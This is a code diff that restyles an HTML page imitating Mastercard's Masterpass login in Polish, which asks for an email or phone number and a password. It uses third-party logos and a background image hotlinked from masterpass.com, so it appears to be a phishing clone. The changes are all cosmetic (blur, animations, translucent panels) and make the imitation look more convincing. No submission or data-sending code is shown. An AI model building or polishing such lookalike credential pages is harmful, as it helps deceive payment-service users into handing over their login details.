@@ -6,11 +6,34 @@
   <title>Masterpass Login</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+  <style>
+    body {
+      background-image: url('https://masterpass.com/etc/designs/masterpass/clientlibs_base/img/homepage/homepage-hero-background.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      animation: fadeBg 8s ease-in-out infinite alternate;
+    }
+
+    @keyframes fadeBg {
+      0% { filter: brightness(1); }
+      100% { filter: brightness(0.9); }
+    }
+
+    .fade-in {
+      animation: fadeIn 0.6s ease-out both;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
-<body class="bg-black flex items-center justify-center min-h-screen font-sans">
-  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
+<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-md">
+  <div class="bg-white/90 backdrop-blur-xl w-[480px] sm:w-[640px] rounded-2xl shadow-2xl relative fade-in transition-all duration-500">
     <!-- Header -->
-    <div class="flex items-center justify-between p-4 border-b">
+    <div class="flex items-center justify-between p-4 border-b border-gray-300">
       <div class="flex items-center space-x-2">
         <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
         <div class="text-sm font-semibold">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
@@ -21,7 +44,7 @@
     <!-- Main content -->
     <div class="flex">
       <!-- Benefits -->
-      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r">
+      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r border-gray-300">
         <div>
           <img src="https://img.icons8.com/ios-filled/24/ef4444/lock--v1.png" />
           <p class="mt-2"><strong>Bezpieczeństwo</strong><br />Płatność, dzięki której sklepy nie widzą danych Twojej karty</p>
@@ -46,13 +69,13 @@
             pattern="(^\\+48\\d{9}$)|(^[\\w.-]+@[\\w.-]+\\.\\w{2,}$)"
             title="Podaj poprawny adres e-mail lub numer telefonu w formacie +48XXXXXXXXX"
             placeholder="Adres e-mail lub numer telefonu"
-            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none transition"
             required />
           <input
             type="password"
             name="password"
             placeholder="Hasło"
-            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none transition"
             required />
           <div class="flex items-center gap-2">
             <input type="checkbox" id="robot" required />
@@ -61,11 +84,11 @@
           </div>
           <div class="flex items-center justify-between text-sm">
             <label><input type="checkbox" id="remember" /> Pamiętaj mój login</label>
-            <a href="#" class="text-black underline hover:text-orange-500">Nie znam hasła</a>
+            <a href="#" class="text-black underline hover:text-orange-500 transition">Nie znam hasła</a>
           </div>
           <button
             type="submit"
-            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed"
+            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed transition duration-300"
             id="loginBtn"
             disabled>
             Zaloguj
@@ -75,10 +98,10 @@
     </div>
 
     <!-- Footer -->
-    <div class="text-xs bg-black text-white p-2 text-center">
+    <div class="text-xs bg-black/80 text-white p-2 text-center rounded-b-lg">
       Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę...
     </div>
-    <div class="bg-white text-xs p-2 flex justify-between items-center border-t">
+    <div class="bg-white/80 text-xs p-2 flex justify-between items-center border-t border-gray-300 rounded-b-2xl">
       <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5" />
       <span>Zgoda na pliki cookies</span>
     </div>
